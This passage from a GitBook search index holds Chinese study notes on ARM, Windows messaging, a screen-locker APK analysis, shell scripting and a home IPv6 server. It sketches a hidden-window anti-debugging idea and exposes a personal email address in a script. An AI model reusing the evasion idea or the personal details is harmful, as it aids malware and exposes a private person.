"},"MyArticles/Basics/arm学习.html":{"url":"MyArticles/Basics/arm学习.html","title":"ARM 基础学习","keywords":"","body":"精简指令集 RISC ARM属于精简指令集，大约100条左右的指令，先比较于x86汇编，arm不能直接操作内存的加减，只能控制寄存器，所以需要将内存ldr到寄存器中进行操作后返回内存。 比x86（CISC）快 RISC指令集允许通过缩短时钟周期来加速代码执行 端序 arm3之前小端序，之后的架构支持大端序，可以手动设置，而x86和x64仅仅支持小端序。 ARM 基本特性 特权模式 1、不同于x86架构的r0内核模式和r3用户模式，arm提供了更多的特权模式（命名用的是英文的缩写）。 USR：用户模式 ---> R3：用户运行的层级 FIQ：快速中断请求模式 IRQ：中断请求模式 SVC：管理模式（supervisor） ---> R0：一般操作系统内核运行的层级 MON：监视模式 ABT：终止模式 UND：未定义指令模式 SYS：系统模式 thumb 都属于arm架构，只不过是指令的长度不同，一个arm程序中可以混用两种指令长度的模式，只需要在汇编代码后面标注就可以。 ARM指令为32位、Thumb为16或者32位。 执行状态选择 0、默认状态下是ARM模式，直到出现显示或者隐式的转换。 1、利用BX、BXL进行跳转的时候，目标寄存器最低位是1（奇数），会切换到thumb模式。 2、程序状态寄存器（CPSR）的T标志位被置起，则切换到thumb模式。 3、32位的thumb指令后面用.W进行标注。 版本问题 thumb-1 用于ARM v6及之前的体系结构，ARM v7只用thumb-2. 条件执行 arm支持 条件执行 ：在指令中编码了算数条件，满足条件才会执行。 优点： 提高了代码密度 减少执行指令的数目 ARM 的每一个指令都支持 条件执行 ，但是默认都是无条件执行的。 桶式位移器 相当于指令的合并操作，在一个指令中包含多步操作。 MOV R1, R0, LSL #1 ;将r0寄存器左移一位后，传递给r1 运行ARM程序 运行 ubuntu1804环境，成功安装qemu，执行显示缺少ld-linux.so.3文件，通过命令 sudo find / -name \"ld-linux.so.3\" 找到对应的so文件，然后使用命令 qemu-arm -L /usr/arm-linux-gnueabihf/lib/ call_ret 运行arm文件。 或者编译的时候直接使用-static静态编译可以解决问题 避免每次运行的时候使用qemu-***的形式，可以下载 apt install binfmt* 调试 使用gdb远程调试的原理，先本机开一个运行端口，然后gdb远程访问。 数据类型 & 寄存器 ARM 的操作都是基于寄存器的操作，无法像x86那样可以直接操作内存中的内容。 换算 32bit = 4byte = 1word = 1/2dword。 16bit = 半字（half word），不知道为啥会单独出一个半字的数据类型。 16bit：扩展后缀为-h或者-sh对应着， byte：-b或者-sb对应着字节 ldr = 加载字，宽度四字节 ldrh = 加载无符号的半字，宽度两字节 ldrsh = 加载有符号的半字，宽度两字节 ldrb = 加载无符号的字节 ldrsb = 加载有符号的字节 str = 存储字，宽度四字节 strh = 存储无符号的半字，宽度两字节 strsh = 存储有符号的半字，宽度两字节 strb = 存储无符号的字节 strsb = 存储有符号的字节 寄存器 定义了16个32bit通用寄存器（R0-R15）r0一般也用来放返回值，最后三个有特殊用处，0-12是通用的。 r11：栈帧寄存器 栈帧寄存器，相当于是rbp r13：栈寄存器 栈指针寄存器，SP。相当于x86架构中的rsp寄存器，永远指向栈顶端。 r14：连接寄存器 连接寄存器，LR。在函数调用中保存返回地址。在BL的时候会把返回地址保存在这个寄存器中，x86会保存在栈顶。 r15：计数寄存器 程序计数寄存器，每次执行一个+8或者+4，类似于rip指令，但是他是支持arm程序直接读写的，并且会执行并跳转，也就是说他并不会一直指向下一条指令， CPSR：程序状态寄存器 类似于x86里的EFLAG或者RFLAG寄存器，保存程序的一些状态。 E 大小端标志位，0-->小端 T thumb标志位，thumb状态为1 M 模式标志位，确定当前特权模式。 系统级控制设置 arm利用 协处理器 来支持额外的指令和系统级设置。 以 MMU（内存 管理 单元） 为例。如果系统是支持的，那么就要要向内核或者启动代码提供对应的接口，在x86架构中，这些接口会放在CR0-CR4寄存器中。 在ARM中， 有16个协处理器，CP0-CP15（P0-P15），每个协处理器有16个寄存器和对应的8个操作码。 协处理器只能通过MRC读和MCR写这俩指令来访问。这俩指令的参数一般是编号的形式，例如：读出转换基址寄存器并保存到CR0中。读出p15中的c2和c0保存在r0中。 这些东西常用在固件中，或者嵌入式开发之类的。 MRC p15, 0, r0, c2, c0, 0 x86中的控制寄存器 CPU架构中共有CR0、CR1、CR2、CR3、CR4、CR8共6个控制寄存器，如下图。 CR0：包含当前处理器运行的控制标志。 CR1：保留。 CR2：包含发生页面错误时的线性地址。 CR3：页面目录表（Page Directory Table）的物理地址。 CR4：包含处理器扩展功能的标志位。 CR8：提供对任务优先级寄存器（Task Priority Register）的读写（仅在64位模式下存在）。 对控制寄存器的读写是通过MOV CRn指令来实现。 ARM 指令集 1、连续横杠间断逗： PUSH {R11,LR} ;将R11和LR寄存器的值push到栈中。 PUSH {R11,R15} ;将R11 到 R15中的值push到栈中。 2、更新基址用叹号： STM R1, {R3-R10} ; R1 = 数组 STM R1!, {R3-R10} ; R1 = 数组+1，将R1的地址更新为R10元素之后的一个 数据加载 & 保存 LDR & STR ldr：从内存向寄存器中加载数据 str：从寄存器中向内存加载数据 从内存中加载和保存1，2，4字节的数据。 LDR R3, [R0] ;取R0地址里的内容给R3寄存器指向的地址 -- R3 = *R0 STR R3, [R0] ;取R3寄存器的值给R0指向的地址 -- R0 = *R3 这里也涉及到了ARM中的9种寻址方式。 立即寻址 寄存器寻址 寄存器间接寻址 寄存器移位寻址 基址变址寻址 相对寻址 多寄存器寻址 堆栈寻址（块拷贝寻址） 实际运用的时候不需要直到是什么方式寻址，能看懂就行了。 LDM & STM 这个和上面的指令一样，区别是操作的数据大小不同，r结尾的是1，2，4字节，m结尾的是操作数据块。 存在四种模式： IA：后递增，写回最后一个地址+4字节地址的地址。 IB：前递增，把数据存储在基地址+4的地址，写回最后一个地址。 DA：后递减，最后的地址是基地址，写回最低地址-4。 DB：前递减：最后的地址是基地址-4，写回最低地址。 类似于x86架构下的rep和movs指令，比如c语言里的memcpy（有时会直接以内联汇编的形式将其附加到代码中，而不是显示的调用这个函数）的功能。 push & pop 这俩个x86架构下的没啥区别，就是x86一般一次一个，这个可以push很多一起进栈。一般用作函数边界的确定。 函数调用 函数调用涉及到了 局部变量 分支跳转 每一次跳转都可以选择thumb和arm 返回值 默认使用r0寄存器 返回地址 可以用栈也可以用LR寄存器，但是用栈的话需要显示的将地址pop到PC寄存器中，否则默认LR寄存器。 调用约定 前4个32位参数放到r0-r3寄存器，其余的用栈。 这几个方面的内容。 跳转指令 B：branch 1、很少遇到的一种无条件跳转，类似于jmp指令。通常用于循环或者判断中，或者调用永不返回的函数 2、只能使用偏移量（当前地址）作为参数，不能跳转寄存器,b R0是非法的 BX：branch exchange 跳转并交换，可以在跳转的时候选择arm或者thumb模式（X结尾的指令），根据目标地址最低位是不是1确定。可以用来跳转寄存器BX R0是合法的。 BX LR 类似于 RET指令 BL：branch and link 跳转并连接指令，类似于call指令，在跳转之前先将返回地址保存到LR寄存器中。 作用和B指令一样，只能跳偏移，不能跳寄存器 BLX：branch linke exchange 如果目的地在32mb之内，使用BL指令较多，跳转地址未知或者不确定，使用BLX指令 arm下调用库函数使用BL thumb下调用库函数使用BLX 计算 LSL , (LSR ASR)：左移和右移 ROR , ROL：循环左右移 ADD , SUB：加减 MUL,：乘法，arm中没有原生除法。会截断结果为32位 AND , ORR , EOR：与或非 分支跳转 & 条件执行 主要依赖于一些标志寄存器的值，记不住，到时候现查就行。 一些后缀编码 EQ = Z==1 NE != Z==0 MI - N==1 PL +, 0 N==0 HI unsigned > C==1 && Z==1 LS unsigned C==0 \\ \\ Z==1 GE >= N=V LT N!=V GT > Z==0 && N=V LE Z==1 \\ \\ N!=V 跳真不跳假。比如BLT这个指令：如果LT为真，则跳转。默认情况下不会更新标志位，除非使用了S后缀。 比较指令会自动更新标志位。 JIT和SMC just-in-time：即时编译 SMC：自修改代码（逆向中的一种反调试技巧）。 arm支持这些玩意。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-23 14:55:58 "},"MyArticles/Basics/Windows消息队列学习.html":{"url":"MyArticles/Basics/Windows消息队列学习.html","title":"Windows消息队列","keywords":"","body":"一、消息队列 消息队列是在什么时候创建的？ 在线程被第一次创建的时候，当线程第一次被创建时，系统假设他不会被用于与任何用户界面所相关的任务，这样可以有效减少系统资源的使用。当检测到他调用一个和与图形相关的函数的时候，系统为他分配额外的资源 Windows下的应用是基于事件驱动的，他等待系统向其传递输入；dos程序是顺序的、过程驱动的。 Windows消息传递的过程： 用户或应用程序的某些行为会产生一些事件。操作系统找到事件所属的应用程序，然后向该应用程序发送条相应的消息。然后，该消息就被加入到该引用程序的消息队列中。之后，应用程序不断地检杳消息队列，每当接收到一条消息时，应用程序就将该消息分发给与该消息所属窗口相关的窗口过程。最后，窗口过程执行与当前消息对应的指令。 Windows消息队列： Windows操作系统的内核空间中有一个系统消息队列（system message queue），在内核空间中还为每个UI线程分配各自的线程消息队列(Thread message queue)。在发生输入事件之后，Windows操作系统的输入设备驱动程序将输入事件转换为一个“消息”投寄到系统消息队列；操作系统的一个专门线程从系统消息队列取出消息，分发到各个UI线程的输入消息队列中。 Windows的事件驱动模式，并不是操作系统把消息主动分发给应用程序；而是由应用程序的每个UI线程通过“消息循环”代码从UI线程消息队列获取消息 Windows为什么使用句柄： 为什么说句柄是一种指向指针的指针。 由于windows是一种以虚拟内存为基础的操作系统，其内存管理器经常会在内存中来回的移动对象，以此来满足各种应用程序对内存的需求。而对象的移动意味着对象内存地址的变化，正是因为如此，如果直接使用指针，在内存地址被改变后，系统将不知道到哪里去再调用这个对象。windows系统为了解决这个问题，系统专门为各种应用程序腾出了一定的内存地址（句柄）专门用来记录这些变化的地址（这些内存地址就是指向指针的指针），这些内存地址本身是一直不变化的。windows内存管理器在移动某些对象之后，他会将这些对象新的内存地址传给句柄，告诉他移动后对象去了哪里 死锁：Message Deadlocks 原因：发送的消息被处理时被”丢弃”了，而发送与接收的线程是同一队列，这就会导致该线程”死”了。 其实可以看做一个相互等待的场景： a线程发消息1给b线程 b线程处理消息1，回调函数中发了消息2给a a接到消息2，但因为b对消息1的处理结果还没回来而等待 b因为消息2的处理结果还没回来而等待 二、相关API postMessage //消息进入消息队列中后立即返回，消息可能不被处理。 PostThreadMessage //消息放入指定线程的消息队列中后立即返回，消息可能不被处理。 SendMessage //消息进入消息队列中，处理后才返回，如果消息不被处理，发送消息的线程将一直处于阻塞状态，等待消息返回。 SendNotifyMessage//如果消息进入本线程，则为SendMessage()，不是则采取postMessage()，当目标线程仍然依send处理 SendMessageTimeout //消息进入消息队列，处理或超时则返回，实际上SendMessage()就是建立在该函数上的 SendMessageCallback //在本线程再指定一个回调函数，当处理完后再次处理 BroadcastSystemMessage //发送目标为系统组件，比如驱动程序 windows编程 c语言的程序至少有一个主函数main，Windows编程中存在两个主函数 int WINAPI WinMain( HINSTANCE hInstance, // handle to current instance HINSTANCE hPrevInstance, // handle to previous instance LPSTR lpCmdLine, // pointer to command line int nCmdShow // show state of window ); LRESULT CALLBACK WindowProc( HWND hwnd, // handle to window UINT uMsg, // message identifier WPARAM wParam, // first message parameter LPARAM lParam // second message parameter ); 第二个是个callback函数，Windows必须至少一个callback函数 第一个winmain函数用来从消息队列中不断的发现消息，并处理消息（发送给对应的窗口函数） MSG msg; //定义消息名 while (GetMessage (&msg, NULL, 0, 0)) { TranslateMessage (&msg) ; //翻译消息 DispatchMessage (&msg) ; //撤去消息 } return msg.wParam; 关于msg的结构定义，Windows中绝大多数都是基于结构体的体系。 typedef struct tagMSG { // msg HWND hwnd; // 要将消息发送到的目标句柄 UINT message; // 一个消息数字，对应一个消息类型 WPARAM wParam; LPARAM lParam; DWORD time; // 消息放入队列的时间（相对于Windows的时间，不是物理时间） POINT pt; // 消息放队列的鼠标位置 } MSG; sendmessage和postmessage 前者发送消息之后需要等到返回才能返回、后者发送之后直接返回，不需要等待。 因为前者直接调用WndProc消息处理函数，所以需要等待返回之后才能返回。 后者是直接把消息放到消息队列中，所以可以直接返回。 三、实际运用 在开发层面运用很多，可以手动创建窗口，也可以利用MFC或者是利用其他的现成的框架。 细节 程序调用CreateWindowEx函数，将窗口的样式被设置成为WS_EX_TOOLWINDOW，该属性的窗口有以下特点： 不在任务栏显示。 不显示在Alt+Tab的切换列表中。 在任务管理器的窗口管理Tab中不显示。 相当于创建了一个隐形窗口。通过消息机制调用回调函数实现创建子程序，利用回调函数可以自己根据消息执行的特点，可以规避调试。 文章https://www.anquanke.com/post/id/176079#h2-7既没有给出hash，图片还寄了，但是提供了一种恶意代码执行的思路，类似于Windows进程注入中的回调注入方式。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-21 23:34:25 "},"MyArticles/Practice.html":{"url":"MyArticles/Practice.html","title":"Practice","keywords":"","body":"纸上得来终觉浅，绝知此事要躬行。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 13:39:10 "},"MyArticles/Practice/YouTubePremium.apk.html":{"url":"MyArticles/Practice/YouTubePremium.apk.html","title":"Malware-APK0","keywords":"","body":"概述 这是一个锁机apk 在twitter上看到的 https://twitter.com/malwrhunterteam/status/1624366684092997634 这是推友的描述，甜品级别的 apk图片就存放在res里的二级目录，基本都一样 显示这么一个东西，同时点击操作失效，在重新启动设备之后，可以缓解，没有什么含金量。 具体分析 解压之后内容很简单，签名目录，资源目录和一个dex文件还有AndroidManifest.xml文件 xml文件分析 先查看应用清单（AndroidManifest.xml） 创建顶层窗口 接收系统完成引导后广播 ：开机启动 允许设置应用墙纸 允许读取外部存储 允许写外部存储 读取用户的联系人数据 读取短信权限 获得精确的位置信息 让CPU一直工作不能停。 允许应用程序打开网络套接字。 允许程序安装包 允许常规应用程序与“相机”类型一起使用 该软件虽然没有啥危害，但是要的权限还不少。根据权限来推测可能会存在socket连接，指令接收，发包，收集短信、相册、位置、联系人信息。 清单权限|安卓开发者 (android.com) dex分析 没有lib文件，直接查看dex文件，查看仅有五个有用类。 MainActivity 先看主类，代码及其简单 首先使用ADRTLogCatReader记录软件运行期间所产生的日志，根据其他分析报告发现大多数的锁机软件会使用这个来记录日志，不知道为啥，说是因为方便。 下面就是正常的oncreate方法创建一个窗口，通过startService利用Class.forName隐式的跳转Activity，然后传入活动，并启动intent跳转，所以这里就定位到了另一个类MyService MyService 主要功能集中在这个类中 大体浏览可以发现缓解措施，因为程序有一个按钮，所以可以定位到onClick方法 可以看到这个if判断，没有任何加密，只要密码是他，就删除当前界面，手机恢复正常。 这里设置了窗口的格式，17代表了居中，通过this.windowManager.addView(this.myView, layoutParams);来设置窗口置顶 整个Android的窗口机制是基于一个叫做 WindowManager，这个接口可以添加view到屏幕，也可以从屏幕删除view。它面向的对象一端是屏幕，另一端就是View，通过WindowManager的 addView方法创建View，这样产生出来的View根据 WindowManager.LayoutParams属性不同，效果也就不同了。比如创建 系统顶级窗口，实现悬浮窗口效果WindowManager的方法很简单，基本用到的就三addView，removeView，updateViewLayout 总结 这个玩意他要这么多敏感权限就实现了一个锁屏的功能，可能是谁的作业吧，他甚至还留下了他的tg，看来是小号。通过微步的关联分析看得出来这是一个成熟的锁机样本模板，本样本是基础版本，只有一层密码，而且密码直接硬编码在代码中，虽然需要了很多敏感权限，但是就锁机了。 从代码风格分析，这里的程序应该是一个相关专业的学生或者是朋友间开玩笑的应用样本。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-02-13 16:18:44 "},"MyArticles/Dailynotes.html":{"url":"MyArticles/Dailynotes.html","title":"Daily notes","keywords":"","body":"天不得时，日月无光；地不得时，草木不生；水不得时，风浪不平；人不得时，利运不通。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 13:40:11 "},"MyArticles/Dailynotes/pdf解析重组.html":{"url":"MyArticles/Dailynotes/pdf解析重组.html","title":"电子书清晰化的尝试 利用python","keywords":"","body":"在网上下载了一个扫描版的pdf电子书，但是书籍看起来不清楚，很模糊。于是想到通过将pdf里的每一页的图片提取出来然后经过锐化，最后再组成pdf的一个形式来使图片里的文字变的清晰。通过python来实现。 因为这是一本绝版书，淘宝上买的高于原价不少，所以决定直接操作pdf。网上找了很多pdf，大小都是一样的（60多MB），所以判定为这是唯一pdf版本，其他版本很难找了。 原画质 文字模糊，给人一种神秘感，通过一定手段来进行锐化处理。 import fitz import glob import os import cv2 import numpy as np def pdf2img(): doc = fitz.open(\"test.pdf\") pages = 20 for i in range(0, pages): page=doc.load_page(i) pix = page.get_pixmap() pix.save(\"img\\\\pdf\"+str(i)+\".png\") # 将图片进行锐化 def changes(): img_dir = \"C:\\\\Users\\\\rootkit\\\\Desktop\\\\pyclean\\\\img\" for img in sorted(glob.glob(\"{}/*\".format(img_dir))): # 读取图片，确保按文件名排序 print(img) image = cv2.imread(img) kernel = np.array([[0, -1, 0], [-1, 5, -1], [0, -1, 0]], np.float32) dst = cv2.filter2D(image, -1, kernel=kernel) cv2.imshow(\"custom_blur_demo\", dst) path = img+\"_c.png\" print(path) cv2.imwrite(path, dst) # print(\"success\") # 将锐化之后的图片重新组合成为pdf def img2pdf(): img_dir = \"C:\\\\Users\\\\rootkit\\\\Desktop\\\\pyclean\\\\img\" doc = fitz.open() for img in sorted(glob.glob(\"{}/*\".format(img_dir))): # 读取图片，确保按文件名排序 if \"_c\" in img: print(img) imgdoc = fitz.open(img) # 打开图片 pdfbytes = imgdoc.convertToPDF() # 使用图片创建单页的 PDF imgpdf = fitz.open(\"pdf\", pdfbytes) doc.insertPDF(imgpdf) # 将当前页插入文档 if os.path.exists(\"allimages.pdf\"): os.remove(\"allimages.pdf\") doc.save(\"allimages.pdf\") # 保存pdf文件 doc.close() print(\"######################\") # 先把pdf转图片，并存储在指定的目录中 pdf2img() # 对图片进行锐化处理 changes() # 图片转pdf img2pdf() 新画质 经过锐化之后，看到图片的效果得到明显改进，黑白对照更加明显了 看上去好像是更像是扫描的了，实际上如下 😅更不清楚了，真他奶奶滴服气啦。 解决方案 去孔夫子旧书网淘本二手书，麻了还有10块的运费，操。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2022-11-21 20:01:48 "},"MyArticles/Dailynotes/ipv6_base_vps.html":{"url":"MyArticles/Dailynotes/ipv6_base_vps.html","title":"搭建ipv6自有服务器","keywords":"","body":"因为之前的vps到期的原因，续费太贵，于是利用ipv6将本机的一个虚拟机作为vps来使用，实测可以通过ssh正常连接访问和scp服务 ssh usrname@###:###:####:####:#### scp local/file usrname@[###:###:####:####:####] 获得ipv6 在学校，没有猫，路由器直接连网线，ipv4的公网ip枯竭，ipv6的多如牛毛。直接打开路由器的ipv6功能，tplink可以，sb水星路由器不行，营业厅送的电子垃圾。 打开路由器的ipv6功能之后，现代电脑默认开启ipv6服务了，使用ipv6测试网站试一下,然后直接ipconfig看一下就可以了。公网ipv6一般是2开头的 一般这个暂时ipv6是公网ip，这个就允许外网访问了。 配置虚拟机 用的vmware，安装一个ubuntu serve，desktop太占资源了，安装好之后改成桥接模式 然后ifconfig看一下ipv6，还有一个问题就是ipv6是会变的，所以需要在变化的时候通知你 ipv6会变 动态分配：网络服务提供商（ISP）通常会采用动态IPv6地址分配，因此您的IPv6地址可能会随着时间的推移而更改。这是为了确保网络资源的有效使用和管理。 重启路由器或重新连接：如果您的路由器或网络设备重新启动或重新连接到网络，它可能会被重新分配一个新的IPv6地址。 网络安全：某些ISP会定期更改其客户的IPv6地址以增强网络安全性。这是为了防止攻击者使用旧的地址来攻击网络。 通知方式 要不就ddns绑定域名，有成本，放弃。 通过邮件通知 check_ip.sh内容如下 ifconfig > ip.txt 就直接运行下面这个脚本就可以 import os import time import smtplib from email.header import Header from email.mime.text import MIMEText def sendEmail(new_addr): message = MIMEText(\"new ipv6 addr --> \"+new_addr) # 邮件内容 message['From'] = Header('Ubuntu-VPS') # 邮件发送者名字 message['To'] = Header('rootkit') # 邮件接收者名字 message['Subject'] = Header('ipv6 has changed!') # 邮件主题 mail = smtplib.SMTP() mail.connect(\"smtp.qq.com\") # 连接 qq 邮箱 mail.login(\"1621043986@qq.com\", \"$$$$$$$$$$$$$$$$$$$\") # 账号和授权码 mail.sendmail(\"1621043986@qq.com\", [\"1621043986@qq.com\"], message.as_string()) # 发送账号、接收账号和邮件信息 addr = '240e:3a1:2095:7100:20c:29ff:fe9b:64f' ipv6 = '' while 1: os.system(\"./check_ip.sh\") with open(\"ip.txt\", 'r')as file: content = file.readlines() ip6 = [] for c in content: if \"inet6\" in c: ip6.append(c) # print(' sss '+c) tmp = ip6[-3].split(' ') # print(tmp) for i in tmp: if len(i) > 24: ipv6 = i # ip 已经更新 # print(ipv6) if \":\" not in ipv6 and len(ipv6) \" + time.strftime(\"%Y-%m-%d %H:%M:%S\", time.localtime()) + \"already send updata information\") print(time.strftime(\"%Y-%m-%d %H:%M:%S\", time.localtime()) + \"no updata\") time.sleep(60 * 5) 腾讯邮箱的登录密钥直接去网页，设置，账户，下面就能找到 主机配置 CPU：5600g 主板：TUF B550m-e memory : 3200 ddr4 英睿达 8*2 电源：长城铜牌500W 1T的希捷酷鱼机械硬盘，装esxi系统； 1T的SN570装win10系统 机箱：嘉航 暗影猎手5 + 仨风扇 散热：AMD原装 / 雅俊 b3-pro 除了电源，都来自pdd。总共2049￥ 系统 win10 用来正常使用，为以后正常使用做准备 esxi6.7 用来当服务器的系统，需要提前打包好网卡驱动，不然只能往服务器上装 使用 直通 AMD的核显直通不太理想，会失败 N卡GPU尚未购买 网络 没有多余配置，开启了路由器的ipv6功能，实现公网访问。 条件有限，没法配置多网卡，比较遗憾。 起虚拟机 直接启 上传iso文件，然后直接在虚拟机界面创建就行 上传 利用本地的VMware先修改虚拟机兼容性 然后导出之后把磁盘合并一下（vmware自带的磁盘合并工具，注意参数就行）。把一些不需要的硬件支持删除掉，不然上传esxi会报错 留下这些就可以了。 通过esxi的界面上传到磁盘，然后ssh连接到esxi，找到磁盘的路径，需要使用自带的工具去修改vmdk的格式去适合esxi，注意thin参数， vmkfstools -i 原始vmdk文件名 新vmdk文件名 -d thin 然后在虚拟机界面进行注册，不要在磁盘界面注册虚拟机，会导致虚拟机无效。 效果 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 16:34:16 "},"MyArticles/Dailynotes/learn_shell.html":{"url":"MyArticles/Dailynotes/learn_shell.html","title":"Shell 学习","keywords":"","body":"记录一下学习shell编程中的一些代码 变量 #!/bin/bash you_name=\"Test Me\" # 这里针对variable的赋值不能有空格，变量名称不能有空格，等号左右不能有空格 echo ${you_name} # 利用语句命令对变量赋值 # 循环用do-done结构，for结尾用分号表示判断语句结束，同时用``来表示命令行或者是指令 for file_name in `ls`; do echo $file_name done # 针对变量的操作 test_variable=\"crootkit\" readonly test_variable # 使变量只读 echo $test_variable # 删除变量(只读变量是不能被删除的,而且设置只读之后不能被恢复) # unset test_variable echo $test_variable 字符串 #!/bin/bash # 根据shell的aaa对单引号和双引号的规则，我决定shell中一律使用双引号 name=\"this is a string\" echo $name test_str=\"look at this \\\"$name\\\" \" echo \"-e\" $test_str echo $test_str 切片 #!/bin/bash # using ${#string} to get the length of string str=\"this is a string\" echo \"len of str is \" ${#str} # using ${string:i:j} to get the sub string in string str=\"acdefghijklmn\" echo ${str:1:5} # find specific string using `` & expr index $string sub_str echo `expr index $str c` 数组 #!/bin/bash arry=(1 2 3 4 5 6 7 8 9 10) # using ${array[@]} to print all array elements echo ${arry[@]} # for array, you must use full ${} to print it arry[0]=\"123\" arry[1]=999999999999 echo ${arry[@]} # get elements nunmber [*] or [@] echo ${#arry[@]} echo ${#arry[*]} # delet specific left str by # # delet specific right str by % str=\"http://aabbccddeeffjjhhiiggkk1122334455\" # delet // left str echo ${str#*//} # delet // right str echo ${str%//*} # if you want delet to point char ,you can use double # or % echo ${str%%a*} # using declare arry just like the dictionary declare -A dict_arry=([\"one\"]=1 [\"two\"]=2 [\"three\"]=3 [\"fore\"]=4) echo ${dict_arry['one']} echo ${dict_arry[@]} echo ${#dict_arry[*]} 计算 #!/bin/bash # full expressoins should be include by `` # using 'expr' to add support to shell, because native shell not support normal calculate # space is required between expreesions and operations var=`expr $1 + $2` echo $1 \"add\" $2 \"equal\" $var # conditional expressions must be included by [], and space between expressions and operations echo $[ $1 == $2 ] # return 0 or 1 if [ $var == 24 ] then echo \"$1 * $2 == 144\" fi # -eq -ne…… 这些关系运算符只支持数字，不支持字符串 n1=\"abcdef\" n2=\"abcdef\" if [ $n1 == $n2 ] then echo \"equal\" else echo \"not equal\" fi # bool operations # -a = and # -o = or # ! = not # 逻辑运算符 # && || # string opre: # -n -z check if the strlen = 0 str=\"abcd\" if [ -z str ] then echo \"zero\" else echo \"no 0\" fi 控制流 判断 if-else #!/bin/bash # 利用if判断有多少参数，程序本身自己的启动命令算¥0，但是程序不会将其计算在参数列表内 if [ $# == 1 ] then echo you have one para $* elif [ $# == 2 ] then echo you have two para $@ else echo you have many para $* fi #(())test if (( $# > 3 )); then echo dayu 3 ge para fi if [ $# > 3 ] then echo above 3 para fi 利用test #!/bin/bash # test 用来判断条件是否成立 n1=$1 n2=$2 if test $n1 -eq $n2 then echo 两个参数相同 else echo 两个参数不同 fi if [ $n1 -eq $n2 ] then echo == else echo != fi s1=\"abcdefg\" s2=\"1234567\" readonly $s1 if test $s1 = $s2 then echo equal else echo no equal fi # 和上面的方法一样，同样可以用来检查文件的一些问题 case-esac #!/bin/bash # 类似于C的switch-case结构，除了语法基本上一样 echo -n input a number: read input_num case $input_num in 1) echo you 1 ;; 2) echo you 2 let input_num++ ;; 3) echo you 3 ;; 4|5|6|7|8|9|10) echo you many ;; *) echo you miss ;; esac # 执行完匹配就结束了，并不会一直执行下去 循环 #!/bin/bash # 循环的间隔默认是通过 \"空格\" for i in 1 2 3 4 5 6 7 do echo -e $i \"\\n\" done str=\"ab cd ef gh ij kl mn\" for c in $str do echo $c ', ' done # 使用let来执行表达式，比如let b=9+1之类的东西，不用带¥标记变量 sum=10 while (( $sum 函数 #!/bin/bash # 函数返回值只能是一个整数 0-255，默认最后一句的结果是返回值，或者用return，主函数用$?来表示返回值 first_func() { printf \"%s\" \"this is my first func in shell\" } first_func echo the retuen is $? add_func() { echo the ten para is ${10} echo the ten para is $10 #这两种计算都是可以的 # return $(( $1 + $2 )) return `expr $1 + $2` } # 函数的参数其实和程序的参数是一样的 add_func 12 12 1 1 1 2 2 2 2 2 3 3 3 echo the res is $? 参数 #!/bin/bash # using $n to use para # first para is this shell # usr para begin from second echo \"测试shell添加启动参数\" echo \"first : $0\" echo \"second : $1\" echo \"third : $2\" # using $# to get num of para echo \"total\" $# #using $* to print all para echo \"all para\" $* # using $$ to get current PID echo $$ # using $* the all argu will be analyse to a string for argumet in \"$*\"; do echo $argumet done # using $@, the argu will be analyse one by one for argu in \"$@\"; do echo $argu done print #!/bin/bash # 在shell里，echo和printf的功能基本类似，但是根据教程说，printf的可移植性更高 # printf format_string [arguments] # %作为格式替换符，类似于c语言；-代表左对齐；数字代表宽度 printf \"%-10s %-12s %-12s\\n\" 我是大傻逼 我在轻化2001 我78kg重 printf \"%-10s %-12s %-12s\\n\" abc def 123aaaaaaa printf \"%-10s %-12s %-12s\\n\" 1 2 3 # 当参数多余格式字符串,会重用最后一个格式化字符输出 printf \"%s %d %f\\n\" abc 123 4.1234 abcdefh # using %b to use \\ # 如果这里用\\s那么就会将n直接输出，但是%B可以解决这个问题 printf \"test \" \"A\\nb\" 文件 读文件直接用cat命令；写文件直接用重定位 >> #!/bin/bash # check the unix attributes file_name=\"testfile\" if [ -e file_name ] then if [ -x file_name ] then echo $file_name is excutable fi else echo \"no such a file\" fi # 类似这种格式，判断符号太多了，先用先查 重定位 #!/bin/bash # 正常的重定位 echo this is a string > redirct_file # 追加 echo add the new string >> redirct_file # 如果你不想让命令输出到屏幕上，可以用/dev/null文件，输入到这个文件的内容都会被抛弃 echo aaaaaaaaaaaaaaaaaaaaaaaaaa > /dev/null # stdin 0 ; stdout 1 # 将报错信息也就是stderr（2）重定向到testfile a=10 let b=a/0 2>>testfile 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-02-19 14:47:18 "},"MyArticles/Development.html":{"url":"MyArticles/Development.html","title":"Development","keywords":"","body":"大丈夫生居天地间，岂能郁郁久居人下。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 13:39:24 "},"MyArticles/Development/Build-Arm.html":{"url":"MyArticles/Development/Build-Arm.html","title":"构建qemu的持续学习","keywords":"","body":"买不起ARM设备，直接在ubuntu上起一个qemu进行模拟arm开发环境 配置环境 sudo apt-get install gcc gcc-arm-linux-gnueabi binutils-arm-linux-gnueabi qemu-user gdb-multiarch 然后再继续安装qemu的依赖项 sudo apt-get install build-essential gcc pkg-config glib-2.0 libglib2.0-dev libsdl1.2-dev libaio-dev libcap-dev libattr1-dev libpixman-1-dev 下载qemu wget https://download.qemu.org/qemu-3.0.0.tar.xz 最简单的就是下载qemu的源码本地编译 建议提前建一个文件夹，然后解压这个文件 tar xvJf qemu-3.0.0.tar.xz 先编译，cd qemu-3.0.0 ./configure 可能的报错： make的时候总是报错，就找到那个报错的文件，把报错的那一行的static关键字删除 关于python的报错：ERROR: Python not found. Use --python=/path/to/python： 直接apt install python, 就行 然后最后一步，可能需要一点时间 make&&make install 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-02-20 19:32:17 "},"MyArticles/Development/查看父进程.html":{"url":"MyArticles/Development/查看父进程.html","title":"查看父进程","keywords":"","body":"原理 Windows下运行一个程序他的父进程一般都是explore，linux下一般是bash，因为是从shell界面直接起的。 